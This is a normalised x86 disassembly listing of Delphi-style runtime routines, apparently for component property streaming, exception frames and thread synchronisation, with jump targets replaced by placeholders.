mov ebx eax
xor eax eax
push ebp
push sub_41f91a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403f84
xor eax eax
push ebp
push sub_41f8fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403eec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e6ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f904
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_403f40
retn
sub_41f928
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f9dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4148a0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41f818
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9e3
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e65c
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414624
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ed80
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f784
pop ecx
jmp r-xdata
jmp r-xdata
sub_41f9e8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414dd0
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ecf0
mov esp ebp
pop ebp
retn
sub_41fa28
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151ec
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eeb8
pop ecx
pop ecx
pop ebp
retn
sub_41fa64
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fab9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414c14
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4206c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fac0
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
sub_41fadc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fbcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f40
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbd2
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403eec
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_4041f8
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41fac4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_40426c
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41fadc
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_40426c
jmp r-xdata
sub_41fc04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fdf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4148a0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42077c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdff
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f10
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403f84
xor eax eax
push ebp
push sub_41fd79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404150
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_40426c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ef64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4148a0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41fadc
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41ed80
jmp r-xdata
sub_41fe10
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fecd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415250
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cffc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42077c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fed4
lea eax [ ebp - 0xc ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_405758
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41fadc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41ed80
sub_41feec
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ff87
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415174
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403430
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_404150
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ed80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_42077c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff8e
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_41ff94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41ffed
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150f4
mov eax [ ebp + 0x8 ]
push eax
call sub_41f730
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420144
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fff4
lea eax [ ebp - 0x10 ]
call sub_40ece8
retn
sub_41fff8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420790
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f5c8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f02c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4148a0
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4200b6 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4148a0
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41f928
pop ecx
jmp r-xdata
push ebp
call sub_41f9e8
pop ecx
jmp r-xdata
push ebp
call sub_41fa64
pop ecx
jmp r-xdata
push ebp
call sub_41fc04
pop ecx
jmp r-xdata
push ebp
call sub_41feec
pop ecx
jmp r-xdata
push ebp
call sub_41ff94
pop ecx
jmp r-xdata
push ebp
call sub_41fa28
pop ecx
jmp r-xdata
push ebp
call sub_41fe10
pop ecx
sub_420144
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_413ef0
test al al
je r-xdata
mov eax ebx
call sub_413d88
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_410fdc
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed5c
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f68c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ee44
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412714
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4206c8
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420527
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x34 ]
call sub_405758
lea eax [ ebp - 0x30 ]
call sub_403eec
lea eax [ ebp - 0x2c ]
call sub_4045cc
lea eax [ ebp - 0x1c ]
call sub_405758
retn
xor eax eax
push ebp
push sub_4204c4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_4141e8
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4201c2 ]
mov eax ebx
call sub_410150
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41eeb8
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410a94
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_411fec
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420674
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405758
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_412cec
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40cffc
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_42077c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42077c
jmp r-xdata
mov eax ebx
call sub_410fdc
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed14
jmp r-xdata
mov eax ebx
call sub_410fdc
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ecf0
jmp r-xdata
mov eax ebx
call sub_411938
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed38
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_411fec
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420674
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_42077c
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_42077c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4204b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420459
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030c4
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_404150
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420674
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e55c
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420460
mov eax [ ebp - 0x14 ]
call sub_403174
retn
sub_420460
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_42077c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e55c
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403174
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_420540
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420586
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_4041f8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42058d
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_420594
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4041ac
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e55c
mov eax esi
call sub_4043ac
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e55c
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_4205dc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042f8
je r-xdata
mov eax esi
call sub_4041ac
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4041ac
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e55c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e55c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e55c
mov dl 0x6
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e55c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e55c
sub_420674
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4206b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405bcc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4205dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4206c0
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4206c8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42076e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405a7c
mov eax [ ebp - 0x8 ]
call sub_4041ac
mov edi eax
mov eax ebx
call sub_404738
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_42077c
mov eax ebx
call sub_404738
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e55c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e55c
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404174
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4205dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420775
lea eax [ ebp - 0xc ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_420790
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420828
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
call sub_420800
mov eax ebx
call sub_42080c
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4209b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420997
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42099e
mov eax [ ebp - 0xc ]
call sub_403174
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4182a8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418198
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420961
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420932
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_4209c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_420b80
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_420a14
push ebx
push esi
push ecx
call sub_403528
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_420c68
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_420c10
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418b44
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420bd8
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403510
lea eax [ ebx + 0x14 ]
call sub_40cfec
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4182a8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_420a98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418304
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41814c
mov edx ebx
mov eax esi
call sub_420a98
sub_420b2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41814c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x10 ] eax
sub_420b58
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418444
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403174
xor eax eax
mov [ ebx + 0x10 ] eax
sub_420b80
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403370
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_420b2c
mov dl 0x1
mov eax ebx
call sub_4210a0
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_421050
sub_420bd8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
